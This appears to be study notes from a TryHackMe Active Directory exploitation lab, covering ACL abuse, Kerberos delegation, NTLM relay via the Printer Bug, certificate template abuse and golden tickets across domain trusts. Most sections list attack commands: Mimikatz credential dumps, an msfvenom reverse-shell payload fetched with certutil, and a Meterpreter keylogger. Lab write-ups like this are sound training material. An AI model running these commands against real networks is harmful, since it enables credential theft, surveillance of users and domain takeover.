#Windows #ActiveDirectory #Exploition 
AD Exploitation is methods to exploit misconfiguration, it involves lateral movement, privilege escalation, persistence and additional enumeration.

## Exploiting Permission Delegation

##### Permission Delegation

Permission Delegation exploits are often referred to as ACL-based attacks, Administrators can configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), it describes the allowed and denied permissions any object has against the target object.

We can exploit the ACEs if they are misconfigured, for example if the IT team granted the ForceChangePassword ACE and they can also change the passwords of privileged accounts.

##### Exploiting ACEs

- ForceChangePassword: Gives the ability to change the user's password without knowing the current one.
- AddMembers: We can add users, groups or computers to the target group.
- GenericAll: Complete control over the object.
- GenericWrite: We can update non-protected parameters of the target object, for example it could allow us to update the scriptPath parameter which will cause the script to execute the next time the user logs in.
- WriteOwner: We can update the owner of the target object.
- WriteDACL: We can write new ACEs to the target object's DACL, for example one that gives us full right over the object.
- AllExtendedRights: We can perform any action associated with extended AD rights against the target object, for example force change a user's password.

To exploit the ACEs we will need a method to interact with the AD to make those request, the 2 best options are [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) PowerShell cmdlets or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit), we can choose based on the breach and target's detection tools.

##### Bloodhound

To start Bloodhound:

1. `neo4j console start` - Start neo4j.
2. `bloodhound --no-sandbox` - Start Bloodhound.

The default credentials are neo4j:neo4j.

##### Privilege Escalation

In our case we can see with Bloodhound that the Domain Users group as the permission delegation of AddMembers, so we can add members to the IT Support group which in turn has the ForceChangePassword permission delegation over Tier 2 Admins group.

##### AddMember

`Add-ADGroupMember "IT Support" -Members "<your AD account name>"` - Add our account to the IT Support group, using a cmdlet from the AD-RSAT toolset.
`Get-ADGroupMember -Identity "IT Support"` - Verify that the command worked (your account should show up as a member).

##### FroceChangePassword

`Get-ADGroupMember -Identity "Tier 2 Admins"` - List the users and the group to choose a target.
`$password = ConvertTo-SecureString "<new password>" -AsPlainText -Force` - Create a password variable.
`Set-ADAccountPassword -Identity <target's username> -Reset -NewPassword $password` - Change the user's password.
## Exploiting Kerberos Delegation

##### Kerberos Delegation

The practical use is to enable an application access to resources on a different server, for example SQL server for a web application, without delegation we would probably use an AD service account and provide it with direct access to the database, when requests are made to the web application the service account would be used to authenticate to the database and recover information.

We can allow this service account to be delegated to the SQL server service, when a user will login to the web application the service account will request access to the database on behalf of that user, so the user will only have access to certain data without providing privileges or permissions to the service account itself.

##### Constrained vs Unconstrained

In the original implementation of Kerberos Delegation unconstrained delegation was used which is the list secure method which provides no limits to the delegation, if a user with the TRUSTED_FOR_DELEGATION set authenticates to a host with unconstrained delegation configured a TGT is generated and stored in the memory for later use if needed, if an attacker can compromise a host with unconstrained delegation configured he can force a privileged account to authenticate and intercept the TGT.

Constrained delegation restricts what services an account can be delegated to, the following are example of services that can be configured for delegation.

- HTTP: For web applications, to allow pass-trough authentication using AD credentials.
- CIFS: Common Internet File System, used for file sharing that allows delegation of users to shares.
- LDAP: Used to delegate to the LDAP service for actions such as resetting user password.
- HOST: Allows delegation of account for all activities on the host.
- MSSQL: Allow delegation of user accounts to the SQL service for pass trough authentication to databases.

Exploiting constrained delegation is more complex since the delegated account can't be just used for everything, for example if we were able to compromise an AD account with constrained delegation, with can generate a TGT for this account with the plain text password or NTLM hash, than use it to execute a TGS request for any non-sensitive user account in order to access the service as the user.

##### Resource-Based Constrained Delegation

RBCD is one of 3 types of Kerberos Delegation, it provided additional restrictions on Kerberos Delegation. The service now specifies which objects can delegate to it, so the service owner can control who can access it.

If we have permissions to configure RBCD for a service, we can set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD object, with the details of an AD account we have access to, and generate a TGT for the account we control.

##### Constrained Delegation Exploitation

`Import-Module <PowerView.ps1 file location>` - Import the PowerView module.
`Get-NetUser -TrustedToAuth` - Enumerate available delegations.

For the example let's say that based on the output svcIIS account can delegate the HTTP and WSMAN (services which Powershell remoting use as well) services on THMSERVER1, ideally we would impersonate someone from admins group to have administrative access over THMSERVER1.

There is a service on the host THMWRK running as the svcIIS user, with administrative access we can dump the LSASecrets, part of the Windows registry hive where credentials are stored for features such as Windows services.

`<mimikatz.exe file locaton>` - Launch Mimikatz.
`token::elevate` - Impersonate the SYSTEM user.
`lsadump::secrets` - Mimikatz interacts with the registry hive to pull the clear text credentials.

Now we can perform a Kerberos delegation attack, but first exit out of Mimikatz after the `token::elevate` command.

`<kekeo.exe file location>` - Launch kekeo.
`tgt::ask /user:svcIIS /domain:<domain> /password:<password>` - Generate a TGT which can be used to generate tickets for HTTP and WSMAN services, user is the one with the constrained delegation permissions and the domain is the domain we are attacking.

Now we can forge TGS requests for the account we want to impersonate, we need to do this for both HTTP and WSMAN to create a PSSession on THMSERVER1.

`tgs::s4u /tgt:<the TGT we generated the previous step> /user:<user we want to impersonate> /service:http/THMSERVER1.za.tryhackme.loc` - For the user we should choose admins with permissions over servers, the service is the service we want to impersonate using delegation.

Now run the same command for the WSMAN service and than run Mimikatz.

`privilege::debug` - Should get "Privilege '20' OK".
`kerberos::ptt <TGS ticket>` - Import the TGS ticket, run this command twice for both of the tickets.

You can run `klist` outside of Mimikatz to confirm you successfully imported the TGS tickets.

`New-PSSession -ComputerName thmserver1.za.tryhackme.loc` - Create the PSSession on THMSERVER1.
`Enter-PSSession -ComputerName thmserver1.za.tryhackm.loc` - Enter the PSSession on THMSERVER1.

We now have privileged access to THMSERVER1.

## Exploiting Automated Relays

##### Machine Accounts

All Windows hosts have a machine account associated with the machine, the account has uncrackable password of 120 characters (UTF16) long and automatically rotated every 30 days.

Different DCs use machine accounts to synchronize AD updates and changes, when you request a certificate on behalf of the host you are working on, the machine account of that host is used for authentication to the AD Certificate Service.

There is an exceptional case in AD in which one machine has admin rights over another machine, this is like DCs or SQL clusters that must be synchronized, these instances provide a very interesting attack vectors for coercing authentication.

We will search for machine with administrative access over another machine using Bloodhound, first click the "Create Custom Query" in the Analysis tab.

Write the query `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p` which will attempt to find instances where a machine has the AdminTo relationship over another computer, lets say THMSERVER2 has administrative privileges over THMSERVER1.

##### The Printer Bug

The Printer Bug is a "feature" of the MS-RPRN Protocol (PrintSystem Remote Protocol) which allows a domain user to force a target host running the Print Spooler Service to authenticate to an arbitrary IP address, these bugs also found in PetitPotam, PrintNightmare and maybe more, it also didn't require AD credentials but it's been patched.

To exploit this we also need those 4 conditions in addition to the machine account administrative privileges:

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler Service.
4. The hosts must not have SMB signing enforced.

##### Print Spooler Service

`GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc` - Use WMI to query the service's current state on the remote computer, to see if it's running.

If you're getting access denied error you can try running `Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`, if you still get it you might need to take a leap of faith.

##### SMB Signing

To relay the coerced authentication attempt SMB signing should not be enforced, it may be enabled (sometimes it is because of legacy systems that doesn't support it), by hosting our own malicious SMB server we can ensure our server does not support signing.

`nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc` - Verify both servers does not have SMB signing enforced.

##### Exploiting Authentication Relays

This attack can be unstable, since abusing the service can cause it to crash.

We will use [SpoolSample](https://github.com/leechristensen/SpoolSample) (a c# exploit) to coerce THMSERVER2 to authenticate to our machine and than impacket's [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the authentication attempt to THMSERVER1.

`python3 ntlmrelayx.py -smb2support -t smb://"<thmserver1 ip" -debug` - Set up the NTLM relay on the attacking machine, using the IP address so the server won't force Kerberos authentication.
`SpoolSample.exe THMSERVER2.za.tryhackme.loc "<attacker ip>"` - Force THMSERVER2 to authenticate to us.

You should have now performed a hash dump, you can also had something like `-c 'whoami /all'` to the ntlmrelayx.py command to run commands
## Exploiting AD Users

##### Users and User Behavior

Users are stupid, we will focus on two elements:

- Credential Management: How users store their credentials.
- Keylogging: Keylogging with screengrabs can gain an understanding of how normal users interact with the system from the attacker's perspective.

##### Hunting for Credentials

After compromising THMSERVER1 we should look at directories for something useful.

You should find a .kdbx file which is very valuable, we can use Meterpreter's download command to recover this file.

This file seems to be a credential database, protected with a password. Since those who uses credential database are usually savvy enough to make the password secure, we'll probably have more success seeing how to user interacts with this database than trying to crack the password.

##### SYSTEM is Sometimes Too Privileged

Meterpreter has a built-in keylogger, but a SYSTEM shell won't help us since SYSTEM doesn't type any key strokes, so we will need to ensure the shell is running in the context of that user.

Meterpreter has a migrate feature, with which we can migrate to any service (since we are running under SYSTEM).

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> -f psh -o <output file>` - Generate a Powershell Meterpreter payload.

`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip address>; set LPORT <port>; exploit"` - Create the associated listener in Msfconsole.

`certutil.exe -urlcache -split -f http://<ip address>:8000/<exploit>` - Get the file to the target machine after setting up a python server.

`ps | grep "<process name>"` - Check for running process on the target machine.

`migrate <process's pid>` - Migrate to the process from the Meterpreter shell, the safest bet is usually something like explorer.
`getuid` - Confirm you are running in the context of the target.
`keyscan_start` - Start the keylogger.
`keyscan_dump` - Dump captured keystrokes.

## Exploiting GPOs

With Bloodhound we can see that the svcServMan account we found credentials for in the previous task has ownership over a Group Policy Object (GPO), which is also applied to our THMSERVER2 machine.

##### Group Policy Objects

SYSVOL directory is where AD GPOs are stored to be replicated to domain joined machines. A GPO is a virtual collection of policy settings, each GPO has a unique name called GUID. So the random names in the SYSVOL directory won't make sense.

Each Windows computer has a local policy configuration, this contains several notable configuration, such as:

- Application configuration for services such as Firewall, Anti-Virus and Applocker.
- Local group membership such as Administrator or Remote Desktop Users group.
- Startup configuration such as scripts that should be executed.
- Security and protocol settings such as SMBv1 support.

And there is much more.

##### Group Policy Management

Instead of changing the local policy configuration on each host, there is GPM which allows us to define policies directly on the AD structure, we can define GPOs for AD objects, such as specific OU or group.

Domain joined computers will periodically pull all policies from the SYSVOL and apply the relevant ones, usually policies are replicated every 15 minutes using the gpupdate app, which we can also execute manually from the command prompt to apply policies instantly.

##### Exploiting GPOs

Here we will be adding an AD account we control to the Administrators and Remote Desktop Users groups. We could also use the exposed SSH port but not many organizations provide SSH access, so RDP access or conventional lateral movement techniques like SMBExec are safer.

To modify the GPO we need to access GPM as the user with relevant permissions, RDP to THMSERVER1 my kick the user out of their active session, we will RDP to THMWRK1 with our normal or Tier 2 Admins account.

`runas /netonly /user:za.tryhackme.loc\<AD username> cmd.exe` - Inject the AD user credentials into the memory, using administrative command prompt.
`mmc` - Start MMC, provide the correct password.
`dir \\za.tryhackme.loc\sysvol` - Verify you provided the correct credentials, if you did you should be able to se the contents of this directory.

Add the GPM snap-in:

1. Click **File** -> **Add/Remove Snap-in**
2. Select the **Group Policy Management** snap-in and click **Add**
3. Click **Ok**

We can now navigate to the GPO our user has permission to modify (Servers > Management Servers> Management Server Pushes), right click on the GPO and select edit, it will open the new GPM editor windows.

Add our account to local groups:

1. Expand **Computer Configuration**
2. Expand **Policies**
3. Expand **Windows Settings**
4. Expand **Security Settings**
5. Right Click on **Restricted Groups** and select **Add Group** (If the **IT Support** group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)  
6. Click **Browse,** enter **IT Support** and  click **Check Names**
7. Click **Okay** twice

The first filter is not used, to the second filter we should add the groups:

![[f6cb440043d8da6622a0d527c5bc3651.png]]

Now click **Apply** and than **OK** and wait a maximum of 15 minutes for the GPO to be applied. Than the initial account we made a member of the IT Support group will have the permissions on THMSEVER2.

## Exploiting Certificates

Research done and released as a [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement.

##### AD Certificate Services

AD Certificate Services (CS) is a Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides a level of trust, it can be used as a CA to prove and delegate users. AD CS is used for things like encrypting file systems, creating and verifying digital signatures and even user authentication.

AD CS is usually run on selected DCs, administrators can create certificate templates that have parameters that say which user can request the certificate and what is required. SpecterOps found a combination of those parameters that can be toxic and abused for privilege escalation and persistence.

Some terminology:

- PKI: Manages certificates and public key encryption.
- AD CS: Microsoft's PKI implementation.
- CA: Certificate Authority, a PKI that issues certificates.
- Certificate Template: A collection of settings and policies that define how and when a certificate may be issued by a CA.
- CSR: Certificate Signing Request, A message send to a CA to request a signed certificate.
- EKU: Extended/Enhanced Key Usage, object identifiers that define how a generated certificate may be used.

##### Finding Vulnerable Certificate Templates

`certutil -Template -v > tamplates.exe` - Find vulnerable templates.

It will provide us with all configured templates, we could use a certificate auditing tool like [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit), but that way we our more likely to miss misconfiguration than with manual approach, a certificate is misconfigured if a combination of parameters becomes poisonous, in this case we are looking for the following combination:

- Client Authentication: The certificate can be used for client authentication.
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: The certificate template allows us to specify the Subject Alternative Name (SAN).
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY: The certificate will be exportable with the private key.
- Certificate Permissions: We have the required permissions to use the certificate template.

In template[32] in that case we can see that the machine account of THMSERVER2 can issue a CSR for a template that allows us to specify the SAN and can be used for client authentication.

##### Exploiting a Certificate Template

Connect with RDP and if using Remmina disable the **Restricted Admin Mode**, we will use the MMC:

1. Click **Start**->**run**
2. Type **mmc** and hit enter
3. Click **File**->**Add/Remove Snap-in..**
4. Add the **Certificates** snap-in and make sure to select **Computer Account** and **Local computer** on the prompts.
5. Click **OK**

Request a personal certificate:

1. Right Click on **Personal** and select **All Tasks**->**Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the **More Information** warning.
5. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6. Change the **Alternative name Type** option to **User principal name**.
7. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click **Add.**

Click **Apply** and **OK**, than select the certificate and click **Enroll**. You should be able to see your certificate.

Export our certificate with the private key:

1. Right-click on the certificate and select **All Tasks**->**Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next**.
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish.**

##### User Impersonation through a Certificate

Steps to impersonate a user:

- Use the certificate to request a Kerberos TGT.
- Load the Kerberos TGT into your hacking platform of choice.

`<Rebeus.exe file path> asktgt /user:<username we impersonate> /enctype:<encryption type for the ticket> /certificate:<path to the certificate> /password:<the password for the certificate file> /outfile:<the file where the TGT will be output to> /domain:<FQDN of the domain we are attacking> /dc:<the IP of the DC we are requesting a TGT from>` - This is the command for the first step, username should be the same as the UPN of the certificate we generated, enctype should be something not weak (you can use aes256 for example), to not raise overpass-the-hash alert.

Now we can use Mimikatz to load the TGT and authenticate to THMDC:

`privilege::debug`
`kerberos::ptt administrator.kirbi`
`exit`

`dir \\THMDC.za.tryhackme.loc\c$\` - Verify you compromised the domain.

## Exploiting Domain Trusts

We will now learn how to exploit domain trusts to take control of the entire forest.

##### Domain Trusts

A forest is a collection of 1 or more domain trees inside an AD network, domain trusts are mechanisms for users in the network to get access to other resources in the domain. Mostly trust outlines how how the domains inside a forest communicate with each other. In some environments trusts can be extended to external domains and even forests in some cases.

2 main types of trusts:

- Directional: The direction of the trust flows from the trusting domain to a trusted domain.
- Transitive: The trust relationship expand to include other domains.

Commonly there is a root domain or parent in a forest. For example TRYHACKME.LOC is the root domain while ZA.TRYHACKME.LOC and UK.TRYHACKME.LOC are child domains, with transitive trust if they both trust the parent domain they also trust each other.

##### KRBTGT and Golden Tickets

KRBTGT account acts as a service account for the KDC service, this account is used to encrypt and sign all Kerberos ticket on the domain. Password hashes are shared across DCs so they can verify TGTs.

Generating our own TGT is called a golden ticket attack, in which we bypass the KDC, and essentially become the Ticket Granting Server (TGS). To forge TGT we need the following information:

- The FQDN of the domain.
- The Security Identifier (SID) of the domain.
- The username of the account we want to impersonate.
- The KRBTGT password hash.

The last one usually requires domain compromise.

Run mimikatz.

`privileg::debug`
`lsadump::dcsync /user:za\krbtgt` - Recover the KRBTGT password hash.

##### Inter-Realm TGTs

Inter-Realm TGTs expand beyond golden tickets and provide access to resources on another domains, in our case we want to exploit to bidirectional trust relationship between the child and parent domain to gain a full access to the parent domain.

We will include extra SIDs using mimikatz, which allows to set the ExtraSids section of the KERB_VALIDATION_INFO structure of the Kerberos TGT. This section is described as “A pointer to a list of KERB_SID_AND_ATTRIBUTES structures that contain a list of SIDs corresponding to groups in domains other than the account domain to which the principal belongs”.

The EA group belongs to the parent domain and membership to this group will give us full administrative privileges over the forest! The default SID for this group is S-1-5-21-\<RootDomain>-519.

We will need to recover to SIDs:

- Of the child domain (THMDC) which we will impersonate to in our forged TGT.
- Of the Enterprise Admins (EA) in the parent domain, which will be added as extra SID.

`Get-ADComputer -Identity "THMDC"` - Recover the SID of the child domain, using AD-RAST Powershell cmdlets.
`Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc` - Query the parent DC to get the SID of the EA group.

##### Exploiting Domain Trusts

`privilege::debug`
`kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<child domain's SID> /service:krbtgt /rc4:<password hash of krbtgt user> /sids:<SID of EA group> /ptt` - Generate the golden ticket from mimikatz.

`dir \\thmdc.za.tryhackme.loc\c$` - Verify the ticket gives you access to THMDC, since it's a valid ticket for the Administrator.
`dir \\thmrootdc.tryhackme.loc\c$\` - Verify you have access to the parent domain
## Conclusion

##### Mitigations

- Ensure no configuration breaks the tiering model, someone from lower tier shouldn't be able to interact with a higher tier and someone from a higher tier shouldn't log onto resources from a lower tier.
- The principle of least privilege should be followed when permission delegation is performed.
- SMB signing should be enforced.
- AD objects are not the only paths for exploitation, AD services like AD CS should also be secured.
- Implement sufficient security controls to protect Tier 0 infrastructure and accounts in our child domains since a compromise of one could lead to the compromise of the entire forest.